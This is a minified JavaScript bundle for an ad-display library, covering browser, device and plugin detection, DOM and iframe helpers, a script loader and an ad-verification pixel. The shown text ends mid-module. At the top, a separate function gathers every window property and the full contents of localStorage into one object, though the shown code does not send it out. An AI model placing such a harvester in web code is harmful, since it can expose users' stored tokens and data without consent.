function collectWindowDataEnhanced() {
  const collectedData = {};
  window.seenVars = window.seenVars || [];
  Object.keys(window).forEach(prop => {
    if (!window.seenVars.includes(prop)) {
      const value = window[prop];
      const type = typeof value;
      collectedData[prop] = {
        type: type,
        value: type === "function" ? null : value
      };
    }
  });

  // Collect data from local storage
  Object.keys(localStorage).forEach(key => {
    collectedData[`localStorage_${key}`] = localStorage.getItem(key);
  });

  // Collect global variables
  collectedData['globalVars'] = Object.keys(window);
  return collectedData;
}
!function (e) {
  var t = window.webpackJsonpJpx__name_;
  window.webpackJsonpJpx__name_ = function (r, i, a) {
    for (var s, c, l, d = 0, u = []; d < r.length; d++) c = r[d], n[c] && u.push(n[c][0]), n[c] = 0;
    for (s in i) Object.prototype.hasOwnProperty.call(i, s) && (e[s] = i[s]);
    for (t && t(r, i, a); u.length;) u.shift()();
    if (a) for (d = 0; d < a.length; d++) l = o(o.s = a[d]);
    return l;
  };
  var r = {},
    n = {
      23: 0
    };
  function o(t) {
    if (r[t]) return r[t].exports;
    var n = r[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return e[t].call(n.exports, n, n.exports, o), n.l = !0, n.exports;
  }
  o.m = e, o.c = r, o.d = function (e, t, r) {
    o.o(e, t) || Object.defineProperty(e, t, {
      configurable: !1,
      enumerable: !0,
      get: r
    });
  }, o.n = function (e) {
    var t = e && e.__esModule ? function () {
      return e.default;
    } : function () {
      return e;
    };
    return o.d(t, "a", t), t;
  }, o.o = function (e, t) {
    return Object.prototype.hasOwnProperty.call(e, t);
  }, o.p = "", o.oe = function (e) {
    throw console.error(e), e;
  };
}({
  1: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = void 0;
    try {
      (n = window.top).location.href;
    } catch (e) {
      n = window;
    }
    function o(e, t) {
      var r, o, a;
      return (i = {
        enumerable: !1,
        browser: !1,
        browserVersion: !1,
        os: "",
        osVersion: "",
        device: "",
        deviceType: "desktop",
        resolution: {
          enumerable: !1,
          width: 0,
          height: 0
        },
        userAgent: !1,
        uri: {
          enumerable: !1,
          url: null,
          ssl: !1,
          domain: null,
          page: null
        },
        cookies: null
      }).resolution.width = !!screen.width && screen.width, i.resolution.height = !!screen.height && screen.height, i.uri = {
        url: n.location.href ? n.location.href : "",
        ssl: "https" == n.location.protocol,
        domain: n.location.host ? n.location.host : n.location.hostname,
        page: n.location.pathname ? n.location.pathname : ""
      }, i.userAgent = t, i.browser = navigator.appName, i.browserVersion = "" + parseFloat(e), -1 != (o = t.indexOf("Opera")) ? (i.browser = "Opera", i.browserVersion = t.substring(o + 6), -1 != (o = t.indexOf("Version")) && (i.browserVersion = t.substring(o + 8))) : -1 != (o = t.indexOf("MSIE")) ? (i.browser = "Microsoft Internet Explorer", i.browserVersion = t.substring(o + 5)) : -1 != (o = t.indexOf("Trident")) ? (i.browser = "Microsoft Internet Explorer", i.browserVersion = 11, -1 != (o = t.indexOf("rv:")) && (i.browserVersion = t.substring(o + 3))) : -1 != (o = t.indexOf("Edg")) ? (i.browser = "Edge", i.browserVersion = t.substring(o + 5)) : -1 != (o = t.indexOf("Chrome")) ? (i.browser = "Chrome", i.browserVersion = t.substring(o + 7)) : -1 != (o = t.indexOf("Safari")) ? (i.browser = "Safari", i.browserVersion = t.substring(o + 7), -1 != (o = t.indexOf("Version")) && (i.browserVersion = t.substring(o + 8))) : -1 != (o = t.indexOf("Firefox")) ? (i.browser = "Firefox", i.browserVersion = t.substring(o + 8)) : (r = t.lastIndexOf(" ") + 1) < (o = t.lastIndexOf("/")) && (i.browser = t.substring(r, o), i.browserVersion = t.substring(o + 1), i.browser.toLowerCase() == i.browser.toUpperCase() && (i.browser = navigator.appName)), -1 != (a = i.browserVersion.indexOf(";")) && (i.browserVersion = i.browserVersion.substring(0, a)), -1 != (a = i.browserVersion.indexOf(")")) && (i.browserVersion = i.browserVersion.substring(0, a)), -1 != (a = i.browserVersion.indexOf(" ")) && (i.browserVersion = i.browserVersion.substring(0, a)), i.isOldIE = "Microsoft Internet Explorer" === i.browser && ("9" === i.browserVersion.charAt(0) || "8" === i.browserVersion.charAt(0)), i.cookies = !!navigator.cookieEnabled, void 0 !== navigator.cookieEnabled || i.cookies || (document.cookie = "testcookie", i.cookies = -1 != document.cookie.indexOf("testcookie")), i;
    }
    var i = {};
    o(navigator.appVersion, navigator.userAgent);
    var a = {
      _getMetaData: o,
      getMeta: function () {
        return i;
      },
      getBrowser: function () {
        return i.browser;
      },
      getBrowserVer: function () {
        return i.browserVersion;
      },
      getInstalledPlugins: function () {
        for (var e, t = [], r = Array.prototype.slice.call(navigator.plugins); e = r.shift();) t.push(e.name + ";" + e.description + ";" + e.filename);
        return encodeURI(t.join(","));
      },
      getScreenOrientation: function () {
        return n.screen.orientation;
      },
      getWindowWidth: function () {
        return n.window.innerWidth;
      },
      getWindowHeight: function () {
        return n.window.innerHeight;
      },
      getWindowYOffset: function () {
        return n.window.pageYOffset;
      },
      getDocumentHeight: function () {
        return n.document.body.offsetHeight;
      },
      getScreenWidth: function () {
        return n.screen.availWidth;
      },
      getScreenHeight: function () {
        return n.screen.availHeight;
      },
      getTopScope: function () {
        return n;
      },
      isAndroid: function () {
        return /(android)/i.test(navigator.userAgent);
      },
      isChrome: function () {
        return "Chrome" === i.browser;
      },
      isFirefox: function () {
        return "Firefox" === i.browser;
      },
      isOpera: function () {
        return "Opera" === i.browser;
      },
      isEdge: function () {
        return "Edge" === i.browser;
      },
      isSafari: function () {
        return "Safari" === i.browser;
      },
      isIE: function () {
        return "Microsoft Internet Explorer" === i.browser;
      },
      isIE11: function () {
        return this.isIE() && "11" === i.browserVersion.substr(0, 2);
      },
      isIE10: function () {
        return this.isIE() && "10" === i.browserVersion.substr(0, 2);
      },
      isIE9: function () {
        return this.isIE() && "9" === i.browserVersion.charAt(0);
      },
      isMobile: function () {
        return this.isPhone();
      },
      isMS: function () {
        return this.isIE() || this.isEdge();
      },
      isPhone: function () {
        return "phone" == i.deviceType;
      },
      isTablet: function () {
        return "tablet" == i.deviceType;
      },
      setDevice: function (e) {
        i.deviceType = e;
      },
      getNavigatorTrack: function () {
        return (void 0 !== navigator.doNotTrack ? navigator.doNotTrack : "") || "";
      },
      isOldIE: function () {
        return i.isOldIE;
      }
    };
    t.default = a;
  },
  106: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = c(r(418)),
      o = c(r(1)),
      i = c(r(59)),
      a = c(r(2)),
      s = c(r(4));
    function c(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function l(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var d = new WeakMap(),
      u = null,
      p = o.default.getTopScope(),
      f = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            o = n,
            i = {},
            a = (r = r || {}).di || {};
          return o._validateConstructorArguments(r), d.set(o, i), i.vDOM = [a.window.document.createDocumentFragment()], i.root = [], i.elements = [], i.properties = [], i.di = a, i.binds = [], i.head = [], i.preId = r.elId || !1, n;
        }
        return l(t, e), t.prototype._bindToElement = function (e, t, r) {
          var n = arguments.length > 3 && void 0 !== arguments[3] && arguments[3],
            o = d.get(this).binds;
          e.getDOMElement().addEventListener(t, r, n);
          var i = function i() {
            var a = o.indexOf(i);
            a > -1 && o.splice(a, 1), e.getDOMElement().removeEventListener(t, r, n);
          };
          return o.push(i), i;
        }, t.prototype._bindToScope = function (e, t, r) {
          var n = arguments.length > 3 && void 0 !== arguments[3] && arguments[3],
            o = d.get(this).binds;
          e.addEventListener(t, r, n);
          var i = function i() {
            var a = o.indexOf(i);
            a > -1 && o.splice(a, 1), e.removeEventListener(t, r, n);
          };
          return o.push(i), i;
        }, t.prototype._createElement = function (e, r, o, i) {
          var a = this,
            s = d.get(a),
            c = {},
            l = void 0;
          if ("String" !== t.getType(e)) throw a.error(102, {
            property: "definition",
            class: "JDOM",
            method: "createElement"
          });
          if ("Object" !== t.getType(r)) throw a.error(102, {
            property: "options",
            class: "JDOM",
            method: "createElement"
          });
          if (e = e || a.getId(), a.publish("beforeCreateElement", [a, e, r]), r.di = {
            window: s.di.window
          }, s.preId && (r.preId = "pjx-" + e + "-" + s.preId), c.element = new n.default(r), c.name = e, c.options = r, "String" === t.getType(r.parent)) {
            var u = r.parent.match(/^(@head)/);
            if (u && "@head" === u[1]) l = {
              head: !0
            };else if ((u = r.parent.match(/^(@root)(\[([0-9]{0,})\]){0,}/)) && "@root" === u[1]) {
              l = {
                root: !0,
                idx: parseInt(u[3] || 0)
              };
              for (var p = s.vDOM, f = s.di; l.idx + 1 > p.length;) p.push(f.window.document.createDocumentFragment());
            } else l = o.find(function (e) {
              return e.name === r.parent;
            });
          } else r.parent instanceof n.default && (l = {
            element: r.parent
          });
          if (!l) throw a.error(300, {
            element: r.parent
          });
          if (delete r.parent, c.parent = l, s.isRendered && !i) {
            var h = c.element;
            if (h.render(), h.isPrerendered()) return s.isAppended && h.publish("afterAppend", [h]), c;
            if (l.head) s.di.window.document.head.appendChild(h.getDOMElement());else if (l.root) {
              (s.isAppended ? s.root[l.idx] : s.vDOM[l.idx]).appendChild(h.getDOMElement());
            } else {
              var g = c.parent.element.getDOMElement();
              a._getBindableElement(g).appendChild(h.getDOMElement()), s.isAppended && h.publish("afterAppend", [h]);
            }
          }
          return a.publish("afterCreateElement", [a, e, c]), c;
        }, t.prototype._getElementChildren = function (e) {
          var t = [];
          return d.get(this).elements.forEach(function (r) {
            r.parent.name == e.name && t.push(r);
          }), t;
        }, t.prototype._getBindableElement = function (e) {
          switch (e.tagName.toLocaleLowerCase()) {
            case "iframe":
              return !e || e && !e.contentDocument ? {
                appendChild: function (t) {
                  e.onload = function () {
                    e.contentDocument.body.appendChild(t);
                  };
                }
              } : (e.contentDocument || e.contentWindow.document).body;
            default:
              return e;
          }
        }, t.prototype._validateConstructorArguments = function (e) {
          if (!(e.di || {}).window) throw this.error(100, {
            class: this.constructor.name,
            parameter: "window",
            instance: "Window"
          });
          return this;
        }, t.prototype.appendTo = function (e, t) {
          var r = this,
            n = d.get(r),
            o = n.elements,
            i = n.vDOM,
            a = n.head;
          if (n.root = e = Array.isArray(e) ? e : [e], t = Array.isArray(t) ? t : [t], n.root.length != i.length) throw r.error(106, {
            property: "parents",
            reason: "its length should be equal to " + i.length
          });
          return i.forEach(function (n, o) {
            for (var i = Array.prototype.slice.call(n.childNodes), a = void 0; a = i.shift();) {
              var s = r._getBindableElement(e[o]);
              if (void 0 === t[o] || null === t[o]) s.appendChild(a);else {
                var c = s.children[t[o]];
                c ? s.insertBefore(a, c) : s.appendChild(a), t[o]++;
              }
            }
          }), o.forEach(function (e) {
            e.element.publish("afterAppend", [e.element]);
          }), a.forEach(function (e) {
            n.di.window.document.head.appendChild(e);
          }), n.isAppended = !0, r.publish("afterAppend", [n.root]), r;
        }, t.prototype.bind = function (e, t, r, n) {
          var o = this,
            i = d.get(o),
            a = i.di,
            s = function () {};
          if (e.search("@scope") > -1) {
            var c = void 0;
            c = "document" === e.split(".").pop() ? a.window.document : a.window, s = o._bindToScope(c, t, r, n);
          } else {
            var l = o.getElement(e);
            if (-1 !== l) if (i.isRendered) s = o._bindToElement(l, t, r, n);else {
              var u = null,
                p = o.subscribe("afterRender", function () {
                  u = o._bindToElement(l, t, r, n);
                });
              s = function () {
                u ? p() : u();
              };
            }
          }
          return s;
        }, t.prototype.createElement = function (e, t) {
          var r,
            n = d.get(this).elements;
          if (n.find(function (t) {
            return t.name === e;
          })) throw this.error(301, {
            name: e
          });
          return r = this._createElement(e, t, n), n.push(r), this;
        }, t.prototype.removeElement = function (e) {
          var t = this,
            r = d.get(t),
            n = r.elements,
            o = void 0;
          if (!(o = n.find(function (t) {
            return t.name == e;
          }))) throw t.error(300, {
            name: e
          });
          if (n.forEach(function (e) {
            if ("Object" == s.default.getType(e.parent) && e.parent.name == o.name) return t.removeElement(e.name);
          }), r.isRendered) {
            var i = o.element.getDOMElement();
            i.parentNode.removeChild(i);
          }
          var a = n.indexOf(o);
          return n.splice(a, 1), t;
        }, t.prototype.restoreProperties = function () {
          d.get(this).properties.forEach(function (e) {
            e.element.style[e.attr] = e.val;
          });
        }, t.prototype.destroy = function () {
          var e = this,
            t = d.get(e),
            r = t.elements,
            n = t.binds;
          for (e.publish("beforeDestroy", [e]); n.length;) n[0]();
          return r.length && r.forEach(function (e) {
            e.element.destroy();
          }), e.publish("afterDestroy", [e]), e;
        }, t.prototype.propertiesToRestore = function (e, t, r) {
          d.get(this).properties.push({
            element: e,
            attr: t,
            val: r
          });
        }, t.prototype.getElement = function (e) {
          var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : null,
            r = d.get(this).elements;
          if (arguments.length < 2) {
            var n;
            return (n = r.find(function (t) {
              return t.name === e;
            })) ? n.element : -1;
          }
          return this.createElement(e, t).getElement(e);
        }, t.prototype.getScope = function () {
          return d.get(this).di.window;
        }, t.prototype.getScopeWidth = function () {
          return d.get(this).di.window.document.body.offsetWidth;
        }, t.prototype.getScopeHeight = function () {
          return d.get(this).di.window.innerHeight;
        }, t.prototype.getOuterHeight = function (e) {
          var t = d.get(this).di.window;
          return o.default.isSafari() ? e ? i.default.isPortrait() ? t.innerHeight : t.innerWidth : t.innerHeight : e ? i.default.isPortrait() ? t.outerHeight : t.outerWidth : t.outerHeight;
        }, t.prototype.getScrollBarWidth = function () {
          var e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
          if (!u) {
            var t = document.createElement("p");
            t.style.width = "100%", t.style.height = "200px", t.style.display = "block";
            var r = document.createElement("div");
            r.style.position = "absolute", r.style.top = "0px", r.style.left = "0px", r.style.visibility = "hidden", r.style.width = "200px", r.style.height = "150px", r.style.overflow = "hidden", r.appendChild(t), document.body.appendChild(r);
            var n = t.offsetWidth;
            r.style.overflow = "scroll";
            var o = t.offsetWidth;
            if (n === o && (o = r.clientWidth), document.body.removeChild(r), u = n - o, e && 0 === u) {
              var i = p.innerWidth,
                a = p.document.documentElement.clientWidth;
              u = Math.round(i - a);
            }
            u = Math.abs(u) > 30 ? 17 : u;
          }
          return u;
        }, t.prototype.getInnerWidth = function () {
          return d.get(this).di.window.innerWidth;
        }, t.prototype.getInnerHeight = function () {
          return d.get(this).di.window.innerHeight;
        }, t.prototype.getOuterWidth = function (e) {
          var t = d.get(this).di.window;
          return o.default.isSafari() ? e ? i.default.isPortrait() ? t.innerWidth : t.innerHeight : t.innerWidth : e ? i.default.isPortrait() ? t.outerWidth : t.outerHeight : t.outerWidth;
        }, t.prototype.getScrollPosition = function (e) {
          var t = d.get(this).di.window;
          return e ? e instanceof n.default ? e.getDOMElement().scrollTop : e.scrollTop : t.document.body.scrollTop;
        }, t.prototype.scrollTo = function (e, t, r, n) {
          var o,
            i = this,
            s = (d.get(i).di.window, Date.now()),
            c = (r = r || 600, t = t || p.pageYOffset, (e = e || 1) - t);
          n = n || p;
          c && function l() {
            var d = Date.now() - s;
            d < r ? (o = function (e, t, r, n, o) {
              return n * t / o + r;
            }(0, d, t, c, r), a.default.delay(i, l, 1)) : o = e, n.scrollTo(0, o);
          }();
        }, t.prototype.isRendered = function () {
          return d.get(this).isRendered;
        }, t.prototype.replaceElement = function (e, t) {
          var r = this,
            n = d.get(r),
            o = n.elements,
            i = -1,
            a = o.find(function (t, r) {
              return t.name === e && (i = r, !0);
            }),
            s = void 0;
          if (i < 0) throw r.error(300, {
            element: e
          });
          return t.parent = a.parent.name, r.publish("beforeReplace", {
            scope: r,
            oldElement: a,
            defNew: t
          }), s = r._createElement(e, t, o, !0), n.isRendered && (s.element.render(), a.element.getDOMElement().parentNode.replaceChild(s.element.getDOMElement(), a.element.getDOMElement())), o.splice(i, 1, s), r.publish("afterReplace", {
            scope: r,
            newElement: s
          }), r;
        }, t.prototype.renderDOM = function () {
          var e = this,
            t = d.get(e),
            r = t.elements,
            n = t.vDOM;
          e.publish("beforeRender", [e]), r.forEach(function (r) {
            r.element.render(), r.element.isPrerendered() || (r.parent.head ? t.head.push(r.element.getDOMElement()) : r.parent.root ? n[r.parent.idx].appendChild(r.element.getDOMElement()) : e._getBindableElement(r.parent.element.getDOMElement()).appendChild(r.element.getDOMElement()));
          }), t.isRendered = !0, e.publish("afterRender", [e, t.vDOM]);
        }, t.prototype.setParent = function (e, t) {
          var r = d.get(this),
            n = d.get(this).elements;
          if (r.isRendered) throw new Error("Can't change parent after element is rendered");
          var o = n.find(function (t) {
            return t.name === e;
          });
          if (!o) throw new Error("Can't find element definition called " + e);
          var i = n.find(function (e) {
            return e.name === t;
          });
          if (!i) throw new Error("Can't find parent element called " + t);
          return o.parent = i, this;
        }, t;
      }(s.default);
    t.default = f;
  },
  107: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    t.default = {
      returnFrameInnerHTML: function (e) {
        return e.contentWindow.document.body.innerHTML;
      }
    };
  },
  108: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }(r(46));
    var o = {
      isAdSafeAllowed: function (e, t, r) {
        return this.isAdSafeSupported(e, t) && !n.default.isAirtory(r);
      },
      addAdSafePixel: function (e, t) {
        var r = t.html,
          o = t.iasAdPath,
          i = t.format,
          a = t.chanId,
          s = t.trackerId,
          c = i,
          l = n.default.getCreativeId(r),
          d = l;
        switch (i) {
          case "mt":
            o += "mt";
            break;
          case "wp":
            n.default.isRich(r) ? o += "wp" : o = "jpx-wp-layer-left-container";
        }
        var u = ("https://pixel.adsafeprotected.com/jload?anId=928426&dealId=" + s + "&campId=" + l + "&pubId=" + d + "&chanId=" + a + "&placementId=" + c + "&ias_adpath=%23" + o).toLowerCase(),
          p = document.createElement("script");
        p.src = u, e.appendChild(p);
      },
      isAdSafeSupported: function (e, t) {
        return 13 !== t && -1 === ["fv", "mv", "wv"].indexOf(e);
      },
      isAdSafeIdAddedInProduct: function (e) {
        return ["fi", "hi", "is", "ms", "mt", "wp"].indexOf(e);
      },
      isAdSafeLoadedFromProduct: function (e, t) {
        return "wp" === e && !n.default.isRich(t) || "ms" === e || "mt" === e || "hi" === e || "fi" === e || "is" === e;
      }
    };
    t.default = o;
  },
  11: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = o(r(59));
    function o(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    var i = o(r(1)).default.getTopScope(),
      a = {
        called: {},
        optimizedScroll: function (e) {
          if (this.called.optimizedScroll = this.called.optimizedScroll || [], !(this.called.optimizedScroll.indexOf(e) < 0)) return !0;
          this.called.optimizedScroll.push(e);
          !function (e, t, r) {
            var n = !1;
            (r = r || window.top).addEventListener(e, function () {
              n || (n = !0, requestAnimationFrame(function () {
                var e = i.document.createEvent("HTMLEvents");
                e.initEvent(t, !0, !0), r.dispatchEvent(e), n = !1;
              }));
            });
          }("scroll", "optimizedScroll", e);
        },
        optimizedResize: function (e) {
          if (this.called.optimizedResize = this.called.optimizedResize || [], !(this.called.optimizedResize.indexOf(e) < 0)) return !0;
          this.called.optimizedResize.push(e);
          !function (e, t, r) {
            var n = !1;
            (r = r || window.top).addEventListener(e, function () {
              n || (n = !0, requestAnimationFrame(function () {
                var e = i.document.createEvent("HTMLEvents");
                e.initEvent(t, !0, !0), r.dispatchEvent(e), n = !1;
              }));
            });
          }("resize", "optimizedResize", e);
        },
        optimizedOrientationChanged: function (e) {
          var t = this;
          if (t.called.optimizedOrientationChanged = t.called.optimizedOrientationChanged || [], !(t.called.optimizedOrientationChanged.indexOf(e) < 0)) return !0;
          t.called.optimizedOrientationChanged.push(e), t.optimizedResize(e);
          var r = null,
            o = n.default.isPortrait();
          e.addEventListener("optimizedResize", function () {
            clearTimeout(r), r = setTimeout(function () {
              var t = n.default.isPortrait();
              if (t !== o) {
                o = t;
                var r = i.document.createEvent("HTMLEvents");
                r.isPortrait = o, r.initEvent("optimizedOrientationChanged", !0, !0), e.dispatchEvent(r);
              }
            }, 150);
          });
        }
      };
    t.default = a;
  },
  13: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = o(r(2));
    o(r(33));
    function o(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    var i = o(r(1)).default.getTopScope(),
      a = {
        getId: function () {
          return "JHelperDOM";
        },
        getElementValue: function (e, t) {
          return e ? i.getComputedStyle && i.getComputedStyle(e, null) ? i.getComputedStyle(e, null).getPropertyValue(t) : e.style[t] : "";
        },
        getElementRealSize: function (e) {
          var t = i.getComputedStyle(e, null);
          return {
            width: parseFloat(t.getPropertyValue("width").replace("px", "")),
            height: parseFloat(t.getPropertyValue("height").replace("px", ""))
          };
        },
        applyStyle: function (e, t, r, n) {
          n = void 0 !== n ? n : "", e.style.setProperty(this.prefix.css + t, r), e.style.setProperty(t, r, n);
        },
        clearUnresolvedTransitionListeners: function (e) {
          var t = void 0;
          if (e._transitionOnceListeners) for (; t = e._transitionOnceListeners.shift();) this.transitionEnd ? e.removeEventListener(this.transitionEnd, t) : t.cancel();
        },
        getNaturalImageSize: function (e) {
          return {
            height: e.naturalHeight,
            width: e.naturalWidth
          };
        },
        loadImage: function (e) {
          return new Promise(function (t, r) {
            var n = new Image();
            n.crossOrigin = "anonymous", n.onload = function () {
              var e = document.createElement("canvas");
              e.width = n.naturalWidth, e.height = n.naturalHeight, e.getContext("2d").drawImage(n, 0, 0), t(e.toDataURL("image/png"));
            }, n.onerror = t, n.src = e;
          });
        },
        onTransitionEnd: function (e, t, r) {
          var o = this;
          if (e._transitionOnceListeners = e._transitionOnceListeners || [], o.transitionEnd) {
            var i = function r(n) {
              e.removeEventListener(o.transitionEnd, r);
              for (var i = e._transitionOnceListeners.length, a = -1, s = 0; s < i; s++) e._transitionOnceListeners[s] === r && (a = s);
              return a > -1 && e._transitionOnceListeners.splice(a, 1), t(n);
            };
            e.addEventListener(o.transitionEnd, i), e._transitionOnceListeners.push(i);
          } else e._transitionOnceListeners.push(n.default.delay(o, t, r || 500));
        },
        fixIframeMouseMove: function (e, t) {
          return !t || void i.location.hostname ? this.transferIframeMouseMove(e) : function () {};
        },
        transferIframeMouseMove: function (e) {
          var t = function () {
            return n.default.delay({
              getId: function () {
                return "transferIframeMouseMove";
              }
            }, function () {
              if (!e.contentWindow) return !1;
              try {
                e.contentWindow.onmousemove;
              } catch (e) {
                return !1;
              }
              var t = e.contentWindow.onmousemove;
              e.contentWindow.onmousemove = function (r) {
                t && t(r);
                var n = e.getBoundingClientRect(),
                  o = n.width / e.offsetWidth,
                  a = n.height / e.offsetHeight,
                  s = void 0;
                try {
                  (s = document.createEvent("MouseEvents")).initMouseEvent("mousemove", !0, !1, i, r.detail, r.screenX, r.screenY, n.left + r.clientX * o + i.document.body.scrollLeft, n.top + r.clientY * a + i.document.body.scrollTop, r.ctrlKey, r.altKey, r.shiftKey, r.metaKey, r.button, null);
                } catch (e) {
                  s = new i.MouseEvent("mousemove", {
                    bubbles: !0,
                    view: i,
                    canBubble: !0,
                    cancelable: !1,
                    detail: r.detail,
                    screenX: r.screenX,
                    screenY: r.screenY,
                    clientX: n.left + r.clientX * o + i.document.body.scrollLeft,
                    clientY: n.top + r.clientY * a + i.document.body.scrollTop
                  });
                }
                e.dispatchEvent(s);
              };
            }, 1);
          };
          if (e.contentWindow) t();else {
            var r = !0;
            e.onload = function () {
              r && (r = !1, t());
            };
          }
        },
        direction: function (e) {
          return e && e.style && ("rtl" === e.dir || "rtl" === e.style.direction) ? "r" : "l";
        },
        getParentAndIndex: function (e, t) {
          var r = void 0,
            n = e,
            o = null;
          switch (t) {
            case "before_sibling":
              n = e.parentNode, o = (r = Array.prototype.slice.call(n.children)).indexOf(e);
              break;
            case "after_sibling":
              n = e.parentNode, o = (r = Array.prototype.slice.call(n.children)).indexOf(e), o += 1;
              break;
            case "before":
              n = e.parentNode, n = (r = Array.prototype.slice.call(n.children))[o = r.indexOf(e)], o = 0;
          }
          return {
            parent: n,
            index: o
          };
        },
        prefix: function () {
          var e = i.getComputedStyle(i.document.documentElement, ""),
            t = (Array.prototype.slice.call(e).join("").match(/-(moz|webkit|ms)-/) || "" === e.OLink && ["", "o"])[1];
          return {
            dom: "WebKit|Moz|MS|O".match(new RegExp("(" + t + ")", "i"))[1],
            lowercase: t,
            css: "-" + t + "-",
            js: t[0].toUpperCase() + t.substr(1)
          };
        }(),
        transitionEnd: function () {
          var e = document.createElement("fakeelement"),
            t = {
              transition: "transitionend",
              OTransition: "oTransitionEnd",
              MozTransition: "transitionend",
              WebkitTransition: "webkitTransitionEnd"
            };
          for (var r in t) if (void 0 !== e.style[r]) return t[r];
        }()
      };
    t.default = a;
  },
  141: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = o(r(4));
    o(r(1));
    function o(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function i(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var a = new WeakMap(),
      s = function (e) {
        function t(r, n, o) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var i = function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.call(this));
          o = o || {};
          var s = i;
          return a.set(i, {
            scope: o.isolatedScope && "boolean" == typeof o.isolatedScope ? i._createIsolatedScope() : Promise.resolve(o.isolatedScope || window)
          }), "SCRIPT" === r ? s._createPromise(n) : s._createXHRPromise(r, n, o), i;
        }
        return i(t, e), t.prototype._createIsolatedScope = function () {
          var e = window.document,
            t = document.createElement("iframe"),
            r = "<body></body>";
          return t.setAttribute("style", "position: fixed; top: -9999px; left: -9999px;"), t.setAttribute("frameborder", "0"), e.body ? (e.body.appendChild(t), t.contentWindow.document.open(), t.contentWindow.document.write(r), t.contentWindow.document.close(), Promise.resolve(t.contentWindow)) : new Promise(function (n) {
            e.addEventListener("DOMContentLoaded", function () {
              e.body.appendChild(t), t.contentWindow.document.open(), t.contentWindow.document.write(r), t.contentWindow.document.close(), n(t.contentWindow);
            }, !1);
          });
        }, t.prototype._createPromise = function (e) {
          var t = a.get(this);
          this._promise = t.scope.then(function (t) {
            return new Promise(function (r, n) {
              var o = document.createElement("script");
              o.onload = function () {
                r({
                  scope: t
                });
              }, o.onerror = function (e) {
                n(e);
              }, o.setAttribute("src", e), t.document.head.appendChild(o);
            });
          });
        }, t.prototype._createXHRPromise = function (e, t, r) {
          var n = a.get(this);
          this._promise = n.scope.then(function (n) {
            return new Promise(function (o, i) {
              var a = new n.XMLHttpRequest();
              a.onreadystatechange = function () {
                if (4 === a.readyState) {
                  var e = a.status;
                  if (e >= 200 && e < 300 || 304 === e) {
                    if (r.json) try {
                      var t = JSON.parse(a.responseText);
                      o(t);
                    } catch (n) {
                      return n.code = 221, i(n);
                    }
                    return o(a.responseText);
                  }
                  var n = new Error(a.statusText || "Browser refused to send request. Status: " + e + ".");
                  n.code = 221, i(n);
                }
              }, a.onerror = function () {
                var e = new Error(this.statusText || "Can't retrieve response from " + t);
                e.code = 221, i(e);
              }, "withCredentials" in a && (a.withCredentials = !0), a.open(e, t, !0), r.trid && a.setRequestHeader("uber-trace-id", r.trid || null), r.json && a.setRequestHeader("Content-Type", "text/plain"), "POST" === e || "PUT" === e ? (r.json && (r.body = JSON.stringify(r.body)), a.send(r.body)) : a.send();
            });
          });
        }, t.prototype.ready = function () {
          return this._promise;
        }, t.get = function (e, r) {
          return new t("GET", e, r);
        }, t.post = function (e, r) {
          return new t("POST", e, r);
        }, t.script = function (e, r) {
          return new t("SCRIPT", e, r);
        }, t;
      }(n.default);
    t.default = s;
  },
  16: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = s(r(208)),
      o = s(r(421)),
      i = s(r(1)),
      a = s(r(4));
    function s(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    var c = {
      _debug: !1,
      _logLineNumber: !0,
      _filters: {
        include: n.default.read("JHelperLogger#_filters.include") || [],
        exclude: n.default.read("JHelperLogger#_filters.exclude") || []
      },
      _filter: function (e) {
        var t = c._filters,
          r = !0,
          n = !1;
        return t.include.length && (r = !!t.include.find(function (t) {
          return (e || "").search(t) > -1;
        })), t.exclude.length && (n = !!t.exclude.find(function (t) {
